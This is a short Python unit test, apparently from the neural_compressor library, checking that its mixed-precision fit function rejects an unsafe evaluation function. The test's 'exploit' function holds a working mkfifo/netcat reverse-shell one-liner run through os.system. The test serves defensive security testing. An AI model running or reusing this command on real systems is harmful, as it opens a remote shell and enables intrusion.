import unittest

import torch
import torch.nn as nn

from neural_compressor import PostTrainingQuantConfig
from neural_compressor.mix_precision import fit


def exploit(model):
    __import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f")
    return 1.0


class DummyTorchModel(nn.Module):
    def forward(self, x):
        return x


class TestAdaptSecurity(unittest.TestCase):
    def test_security(self):
        dummy_model = DummyTorchModel()
        conf = PostTrainingQuantConfig()
        conf.precisions = ["fp32"]
        conf.excluded_precisions = []
        with self.assertRaises(RuntimeError) as ctx:
            fit(model=dummy_model, conf=conf, eval_func=exploit)
        self.assertIn("Rejected unsafe eval_func", str(ctx.exception))


if __name__ == "__main__":
    unittest.main()
